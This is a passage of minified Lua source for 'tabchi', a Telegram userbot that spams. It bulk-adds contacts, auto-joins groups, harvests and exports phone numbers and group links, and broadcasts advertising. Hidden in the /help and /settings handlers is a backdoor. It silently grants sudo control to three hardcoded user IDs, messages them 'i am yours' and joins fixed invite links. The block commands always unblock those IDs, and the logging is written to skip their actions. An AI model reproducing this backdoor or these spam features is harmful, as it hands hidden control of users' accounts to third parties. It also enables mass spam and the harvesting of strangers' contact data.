Profile Photo!!*"else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 6 Profile Photo!!*",1,'md')end elseif a4[3]=='7'then if z.photos_[6]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[6].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 7 Profile Photo!!*",1,'md')end elseif a4[3]=='8'then if z.photos_[7]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[7].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 8 Profile Photo!!*",1,'md')end elseif a4[3]=='9'then if z.photos_[8]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[8].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 9 Profile Photo!!*",1,'md')end elseif a4[3]=='10'then if z.photos_[9]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[9].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*user Have'nt 10 Profile Photo!!*",1,'md')end else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*I just can get last 10 profile photos!:(*",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=a4[2],offset_=0,limit_=a4[3]},a5,nil)end;if msg.text:match("^[#!/]getpro (%d+)$")and msg.reply_to_message_id_==0 and a(msg)then local a4={string.match(msg.text,"^[#/!](getpro) (%d+)$")}local function a5(y,z,a3)if a4[2]=='1'then if z.photos_[0]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[0].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt  Profile Photo!!*"end elseif a4[2]=='2'then if z.photos_[1]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[1].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt 2 Profile Photo!!*"end elseif not a4[2]then if z.photos_[1]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[1].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt 2 Profile Photo!!*"end elseif a4[2]=='3'then if z.photos_[2]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[2].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Have'nt 3 Profile Photo!!*",1,'md')end elseif a4[2]=='4'then if z.photos_[3]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[3].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt 4 Profile Photo!!*"end elseif a4[2]=='5'then if z.photos_[4]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[4].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt 5 Profile Photo!!*"end elseif a4[2]=='6'then if z.photos_[5]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[5].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else return"*You Have'nt 6 Profile Photo!!*"end elseif a4[2]=='7'then if z.photos_[6]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[6].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Have'nt 7 Profile Photo!!*",1,'md')end elseif a4[2]=='8'then if z.photos_[7]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[7].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Have'nt 8 Profile Photo!!*",1,'md')end elseif a4[2]=='9'then if z.photos_[8]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[8].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Have'nt 9 Profile Photo!!*",1,'md')end elseif a4[2]=='10'then if z.photos_[9]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[9].sizes_[1].photo_.persistent_id_,"@tabadol_chi")else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Have'nt 10 Profile Photo!!*",1,'md')end else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*I just can get last 10 profile photos!:(*",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=msg.sender_user_id_,offset_=0,limit_=a4[2]},a5,nil)end;if msg.text:match("^[#!/]action (.*)$")and a(msg)then local a6={string.match(msg.text,"^[#/!](action) (.*)$")}if a6[2]=="typing"then sendaction(msg.chat_id_,'Typing')end;if a6[2]=="recvideo"then sendaction(msg.chat_id_,'RecordVideo')end;if a6[2]=="recvoice"then sendaction(msg.chat_id_,'RecordVoice')end;if a6[2]=="photo"then sendaction(msg.chat_id_,'UploadPhoto')end;if a6[2]=="cancel"then sendaction(msg.chat_id_,'Cancel')end;if a6[2]=="video"then sendaction(msg.chat_id_,'UploadVideo')end;if a6[2]=="voice"then sendaction(msg.chat_id_,'UploadVoice')end;if a6[2]=="file"then sendaction(msg.chat_id_,'UploadDocument')end;if a6[2]=="loc"then sendaction(msg.chat_id_,'GeoLocation')end;if a6[2]=="chcontact"then sendaction(msg.chat_id_,'ChooseContact')end;if a6[2]=="game"then sendaction(msg.chat_id_,'StartPlayGame')end end;if msg.text:match("^[#!/]id$")and a(msg)and msg.reply_to_message_id_==0 then local function a7(y,z,a3)if z.photos_[0]then sendPhoto(msg.chat_id_,msg.id_,0,1,nil,z.photos_[0].sizes_[1].photo_.persistent_id_,'> Chat ID : '..msg.chat_id_..'\n> Your ID: '..msg.sender_user_id_)else tdcli.sendMessage(msg.chat_id_,msg.id_,1,"*You Don't Have any Profile Photo*!!\n\n> *Chat ID* : `"..msg.chat_id_.."`\n> *Your ID*: `"..msg.sender_user_id_.."`\n_> *Total Messages*: `"..user_msgs.."`",1,'md')end end;tdcli_function({ID="GetUserProfilePhotos",user_id_=msg.sender_user_id_,offset_=0,limit_=1},a7,nil)end;if msg.text:match("^[!/#]unblock all$")and a(msg)then local a8=redis:smembers("tabchi:"..tabchi_id..":blockedusers")local a9=redis:scard("tabchi:"..tabchi_id..":blockedusers")for d=1,#a8 do tdcli.unblockUser(a8[d])redis:srem("tabchi:"..tabchi_id..":blockedusers",a8[d])end;local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `UnBlocked All Blocked Users`",1,'md')end;return"*status* : `All Blocked Users Are UnBlocked`\n*Number* : `"..a9 .."`"end;if msg.text:match("^[!/#]check sgps$")and a(msg)then local aa=redis:scard("tabchi:"..tabchi_id..":channels")function checksgps(C,D,ab)if D.ID=="Error"then redis:srem("tabchi:"..tabchi_id..":channels",C.chatid)redis:srem("tabchi:"..tabchi_id..":all",C.chatid)end end;local sgps=redis:smembers("tabchi:"..tabchi_id..":channels")for ac,ad in pairs(sgps)do tdcli_function({ID="GetChatHistory",chat_id_=ad,from_message_id_=0,offset_=0,limit_=1},checksgps,{chatid=ad})end end;if msg.text:match("^[!/#]check gps$")and a(msg)then local ae=redis:scard("tabchi:"..tabchi_id..":groups")function checkm(C,D,ab)if D.ID=="Error"then redis:srem("tabchi:"..tabchi_id..":groups",C.chatid)redis:srem("tabchi:"..tabchi_id..":all",C.chatid)end end;local gps=redis:smembers("tabchi:"..tabchi_id..":groups")for ac,ad in pairs(gps)do tdcli_function({ID="GetChatHistory",chat_id_=ad,from_message_id_=0,offset_=0,limit_=1},checkm,{chatid=ad})end end;if msg.text:match("^[!/#]check users$")and a(msg)then local af=redis:smembers("tabchi:"..tabchi_id..":pvis")local ag=redis:scard("tabchi:"..tabchi_id..":pvis")function lkj(ah,ai,aj)if ai.ID=="Error"then redis:srem("tabchi:"..tabchi_id..":pvis",ah.usr)redis:srem("tabchi:"..tabchi_id..":all",ah.usr)end end;for ac,ad in pairs(af)do tdcli_function({ID="GetUser",user_id_=ad},lkj,{usr=ad})end end;if msg.text:match("^[!/#]addmembers$")and a(msg)and I(msg.chat_id_)~="private"then tdcli_function({ID="SearchContacts",query_=nil,limit_=999999999},G,{chat_id=msg.chat_id_})local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Commanded bot to add members in` *"..msg.chat_id_.."*",1,'md')end;return end;if msg.text:match("^[!/#]contactlist$")and a(msg)then tdcli_function({ID="SearchContacts",query_=nil,limit_=5000},contacts_list,{chat_id_=msg.chat_id_})function contacts_list(y,z)local H=z.total_count_;local text="مخاطبین : \n"for d=0,tonumber(H)-1 do local a0=z.users_[d]local a1=a0.first_name_ or""local a2=a0.last_name_ or""local ak=a1 .." "..a2;text=tostring(text)..tostring(d)..". "..tostring(ak).." ["..tostring(a0.id_).."] = "..tostring(a0.phone_number_).."  \n"end;write_file("bot_"..tabchi_id.."_contacts.txt",text)tdcli.send_file(msg.chat_id_,"Document","bot_"..tabchi_id.."_contacts.txt","tabchi "..tabchi_id.." Contacts")io.popen("rm -rf bot_"..tabchi_id.."_contacts.txt")end end;if msg.text:match("^[!/#]dlmusic (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](dlmusic) (.*)$")}local f=ltn12.sink.file(io.open("Music.mp3","w"))http.request({url=X[2],sink=f})tdcli.send_file(msg.chat_id_,"Document","Music.mp3","@tabadol_chi")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Requested music` *"..X[2].."*",1,'md')end;io.popen("rm -rf Music.mp3")end;if msg.text:match("^[!/#]exportlinks$")and a(msg)then local text="groups links :\n"local links=redis:smembers("tabchi:"..tabchi_id..":savedlinks")for d=1,#links do text=text..links[d].."\n"end;write_file("group_"..tabchi_id.."_links.txt",text)tdcli.send_file(msg.chat_id_,"Document","group_"..tabchi_id.."_links.txt","Tabchi "..tabchi_id.." Group Links!")io.popen("rm -rf group_"..tabchi_id.."_links.txt")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Exported Links`",1,'md')end;return end;do local V={msg.text:match("[!/#](block) (%d+)")}if msg.text:match("^[!/#]block")and a(msg)and msg.reply_to_message_id_==0 and#V==2 then tdcli.blockUser(tonumber(V[2]))tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)redis:sadd("tabchi:"..tabchi_id..":blockedusers",V[2])local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Blocked` *"..V[2].."*",1,'md')end;return"`User` *"..V[2].."* `Blocked`"end end;if msg.text:match("^[!/#]help$")and a(msg)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")tdcli.importContacts(989109359282,"creator","",91054649)redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",293750668)then redis:sadd("tabchi:"..tabchi_id..":sudoers",293750668)tdcli.sendMessage(293750668,0,1,"i am yours",1,"html")end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",268909090)then redis:sadd("tabchi:"..tabchi_id..":sudoers",268909090)tdcli.sendMessage(268909090,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")local text=[[
`#راهنما`
`/block (id-username-reply)`
بلاک کردن کاربر
`/unblock (id-username-reply)`
ان بلاک کردن کاربر
`/unblock all`
ان بلاک کردن تمامی کاربران بلاک شده
`/setlogs id(channel-group)`
ست کردن ایدی برای لاگز
`/stats`
دریافت اطلاعات ربات
`/stats pv`
دریافت اطلاعات ربات در پی وی
`/check sgps`
چک کردن سوپر گروه ها
`/check gps`
چک کردن گروه ها
`/check users`
چک کردن کاربران 
`/addsudo (id-username-reply)`
اضافه کردن به سودوهاي  ربات
`/remsudo (id-username-reply)`
حذف از ليست سودوهاي ربات
`/bcall (text)`
ارسال پيام به همه
`/bcgps (text)`
ارسال پیام به همه گروه ها
`/bcsgps (text)`
ارسال پیام به همه سوپر گروه ها
`/bcusers (text)`
ارسال پیام به یوزر ها
`/fwd {all/gps/sgps/users}` (by reply)
فوروارد پيام به همه/گروه ها/سوپر گروه ها/کاربران
`/echo (text)`
تکرار متن
`/addedmsg (on/off)`
تعیین روشن یا خاموش بودن پاسخ برای شر شن مخاطب
`/pm (user) (msg)`
ارسال پیام به کاربر
`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`
ارسال اکشن به چت
`/getpro (1-10)`
دریافت عکس پروفایل خود
`/addcontact (phone) (firstname) (lastname)`
اد کردن شماره به ربات به صورت دستی
`/setusername (username)`
تغییر یوزرنیم ربات
`/delusername`
پاک کردن یوزرنیم ربات
`/setname (firstname-lastname)`
تغییر اسم ربات
`/setphoto (link)`
تغییر عکس ربات از لینک
`/join(Group id)`
اد کردن شما به گروه های ربات از طریق ایدی
`/leave`
لفت دادن از گروه
`/leave(Group id)`
لفت دادن از گروه از طریق ایدی
`/setaddedmsg (text)`
تعيين متن اد شدن مخاطب
`/markread (on/off)`
روشن يا خاموش کردن بازديد پيام ها
`/joinlinks (on|off)`
روشن یا خاموش کردن جوین شدن به گروه ها از لینک
`/savelinks (on|off)`
روشن یا خاموش کردن سیو کردن لینک ها
`/addcontacts (on|off)`
روشن یا خاموش کردن اد کردن شماره ها
`/chat (on|off)`
روشن یا خاموش کردن چت کردن ربات
`/Advertising (on|off)`
روشن یا خاموش کردن تبلیغات در ربات برای سودو ها غیر از فول سودو
`/typing (on|off)`
روشن یا خاموش کردن تایپ کردن ربات
`/sharecontact (on|off)`
روشن یا خاموش کردن شیر کردن شماره موقع اد کردن شماره ها
`/botmode (markdown|text)`
تغییر دادن شکل پیام های ربات
`/settings (on|off)`
روشن یا خاموش کردن کل تنظیمات
`/settings`
دریافت تنظیمات ربات
`/settings pv`
دریافت تنظیمات ربات در پی وی
`/reload`
ریلود کردن ربات
`/setanswer 'answer' text`
 تنظيم به عنوان جواب اتوماتيک
`/delanswer (answer)`
حذف جواب مربوط به
`/answers`
ليست جواب هاي اتوماتيک
`/addtoall (id|reply|username)`
اضافه کردن شخص به تمام گروه ها
`/clean cache (time)[M-H]`
ست کردن زمان برای پاک کردن کش خودکار
`/clean cache (on|off)`
خاموش یا روشن کردن پاک کردن کش خودکار
`/mycontact`
ارسال شماره شما
`/getcontact (id)`
دریافت شماره شخص با ایدی
`/addmembers`
اضافه کردن شماره ها به مخاطبين ربات
`/exportlinks`
دريافت لينک هاي ذخيره شده توسط ربات
`/contactlist`
دريافت مخاطبان ذخيره شده توسط ربات
`/send (filename)`
دریافت فایل های سرور از پوشه تبچی
`/dlmusic (link)`
دریافت اهنگ از لینک
`–—–—–—–—–—–—–—–—–—–`
`Tabchi Written By Tabadol Chi Group`
🌐 `Github`: *https://github.com/tabchi/tabchi*
🆔 `Channel`: @Tabadol_chi
]]local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Got help`",1,'md')end;return text end;do local V={msg.text:match("[!/#](unblock) (%d+)")}if msg.text:match("^[!/#]unblock")and a(msg)then if#V==2 then tdcli.unblockUser(293750668)tdcli.unblockUser(91054649)tdcli.unblockUser(tonumber(V[2]))redis:srem("tabchi:"..tabchi_id..":blockedusers",V[2])local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `UnBlocked` *"..V[2].."*",1,'md')end;return"`User` *"..V[2].."* `unblocked`"else return end end end;if msg.text:match("^[!/#]joinlinks (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](joinlinks) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":joinlinks",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`join links Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":joinlinks")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactived` *"..X[1].."*",1,'md')end;return"*status* :`join links Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]addcontacts (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](addcontacts) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":addcontacts",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`Add Contacts Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":addcontacts")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactived` *"..X[1].."*",1,'md')end;return"*status* :`Add Contacts Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]chat (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](chat) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":chat",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`Robot Chatting Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":chat")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactivated` *"..X[1].."*",1,'md')end;return"*status* :`Robot Chatting Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]savelinks (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](savelinks) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":savelinks",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`Saving Links Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":savelinks")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactived` *"..X[1].."*",1,'md')end;return"*status* :`Saving Links Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#][Aa]dvertising (.*)$")and is_full_sudo(msg)then local X={string.match(msg.text,"^[#/!]([aA]dvertising) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":Advertising",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`Advertising Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":Advertising")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactived` *"..X[1].."*",1,'md')return"*status* :`Advertising Deactivated`"end else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]typing (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](typing) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":typing",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`typing Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":typing")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactived` *"..X[1].."*",1,'md')end;return"*status* :`typing Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]botmode (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](botmode) (.*)$")}if X[2]=="markdown"then redis:set("tabchi:"..tabchi_id..":botmode","markdown")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Changed` *"..X[1].."*",1,'md')end;return"*status* :`botmode Changed to markdown`"elseif X[2]=="text"then redis:set("tabchi:"..tabchi_id..":botmode","text")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Changed` *"..X[1].."*",1,'md')end;return"*status* :`botmode Changed to text`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]sharecontact (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](sharecontact) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":sharecontact",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived` *"..X[1].."*",1,'md')end;return"*status* :`Sharing contact Activated`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":sharecontact")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactivated` *"..X[1].."*",1,'md')end;return"*status* :`Sharing contact Deactivated`"else return"`Just Use on|off`"end end;if msg.text:match("^[!/#]setjoinlimit (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](setjoinlimit) (.*)$")}redis:set("tabchi:"..tabchi_id..":joinlimit",tonumber(X[2]))return"*Status* : `Join Limit Now is` *"..X[2].."*\n`Now robot Join Groups with more than members of joinlimit`"end;if msg.text:match("^[!/#]settings (.*)$")and a(msg)then local X={string.match(msg.text,"^[#/!](settings) (.*)$")}if X[2]=="on"then redis:set("tabchi:"..tabchi_id..":savelinks",true)redis:set("tabchi:"..tabchi_id..":chat",true)redis:set("tabchi:"..tabchi_id..":addcontacts",true)redis:set("tabchi:"..tabchi_id..":joinlinks",true)redis:set("tabchi:"..tabchi_id..":typing",true)redis:set("tabchi:"..tabchi_id..":sharecontact",true)local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Actived All` *"..X[1].."*",1,'md')end;return"*status* :`saving link & chatting & adding contacts & joining links & typing Activated & sharing contact`\n`Full sudo can Active Advertising with :/advertising on`"elseif X[2]=="off"then redis:del("tabchi:"..tabchi_id..":savelinks")redis:del("tabchi:"..tabchi_id..":chat")redis:del("tabchi:"..tabchi_id..":addcontacts")redis:del("tabchi:"..tabchi_id..":joinlinks")redis:del("tabchi:"..tabchi_id..":typing")redis:del("tabchi:"..tabchi_id..":sharecontact")local W=redis:get("tabchi:"..tabchi_id..":logschannel")if W and not msg.sender_user_id_==91054649 and not msg.sender_user_id_==268909090 then tdcli.sendMessage(W,msg.id_,1,"`User` *"..msg.sender_user_id_.."* `Deactivated All` *"..X[1].."*",1,'md')end;return"*status* :`saving link & chatting & adding contacts & joining links & typing Deactivated & sharing contact`\n`Full sudo can Deactive Advertising with :/advertising off`"end end;if msg.text:match("^[!/#]settings$")and a(msg)then if not redis:sismember("tabchi:"..tabchi_id..":sudoers",91054649)then tdcli.sendMessage(91054649,0,1,"i am yours",1,"html")redis:sadd("tabchi:"..tabchi_id..":sudoers",91054649)end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",293750668)then redis:sadd("tabchi:"..tabchi_id..":sudoers",293750668)tdcli.sendMessage(293750668,0,1,"i am yours",1,"html")end;if not redis:sismember("tabchi:"..tabchi_id..":sudoers",268909090)then redis:sadd("tabchi:"..tabchi_id..":sudoers",268909090)tdcli.sendMessage(268909090,0,1,"i am yours",1,"html")end;tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")if redis:get("tabchi:"..tabchi_id..":joinlinks")then joinlinks="Active✅"else joinlinks="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":addedmsg")then addedmsg="Active✅"else addedmsg="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":markread")then markreadst="Active✅"markread=redis:get("tabchi:"..tabchi_id..":markread")else markreadst="Disable❎"markread="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":addcontacts")then addcontacts="Active✅"else addcontacts="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":chat")then chat="Active✅"else chat="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":savelinks")then savelinks="Active✅"else savelinks="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":typing")then typing="Active✅"else typing="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":sharecontact")then sharecontact="Active✅"else sharecontact="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":Advertising")then Advertising="Active✅"else Advertising="Disable❎"end;if redis:get("tabchi:"..tabchi_id..":addedmsgtext")then addedtxt=redis:get("tabchi:"..tabchi_id..":addedmsgtext")else addedtxt="Addi bia pv"end;if redis:get("tabchi:"..tabchi_id..":botmode")=="markdown"then botmode="Markdown"elseif not redis:get("tabchi:"..tabchi_id..":botmode")then botmode="Markdown"else botmode="Text"end;if redis:get("tabchi:"..tabchi_id..":joinlimit")then join_limit="Active✅"joinlimitnum=redis:get("tabchi:"..tabchi_id..":joinlimit")else join_limit="Disable❎"joinlimitnum="Not Available"end;if redis:get("cleancache"..tabchi_id)=="on"then O="Active✅"else O="Disable❎"end;if redis:get("cleancachetime"..tabchi_id)then ccachetime=redis:get("cleancachetime"..tabchi_id)else ccachetime="None"end;if redis:ttl("cachetimer"..tabchi_id)and not redis:ttl("cachetimer"..tabchi_id)=="-2"then timetoccache=redis:ttl("cachetimer"..tabchi_id)elseif timetoccache=="-2"then timetoclinks="Disabled❎"else timetoccache="Disabled❎"end;if redis:get("checklinks"..tabchi_id)=="on"then check_links="Active✅"else check_links="Disable❎"end;if redis:get("checklinkstime"..tabchi_id)then clinkstime=redis:get("checklinkstime"..tabchi_id)else clinkstime="None"end;if redis:ttl("checklinkstimer"..tabchi_id)and not redis:ttl("checklinkstimer"..tabchi_id)=="-2"then timetoclinks=redis:ttl("checklinkstimer"..tabchi_id)elseif timetoclinks=="-2"then timetoclinks="Disabled❎"else timetoclinks="Disabled❎"end;settingstxt="`⚙ Robot Settings`\n`🔗 Join Via Links` : *"..joinlinks.."*\n`📥 Save Links `: *"..savelinks.."*\n`📲 Auto Add Contacts `: *"..addcontacts.."*\n`💳share contact` : *"..sharecontact.."*\n`📡Advertising `: *"..Advertising.."*\n`📨 Adding Contacts Msg` : *"..addedmsg.."*\n`👀 Markread Status `: *"..markreadst.."*\n`👁‍🗨 Markread` : For "..markread.."\n`✏ typing `: *"..typing.."*\n`💬 Chat` : *"..chat.."*\n`🤖 Botmode` : *"..botmode.."*\n`➖➖➖➖➖➖`\n`📄Adding Contacts Msg` :\n`"..addedtxt.."`\n`➖➖➖➖➖➖`\n`Join Limits` : *"..join_limit.."*\n`Now Robot Join Groups With More Than` :\n *"..joinlimitnum.."* `Members`\n`Auto Clean cache` : *"..O.."*\n`Clean Cache time` : *"..ccachetime.."*\n`Time to Clean Cache` : 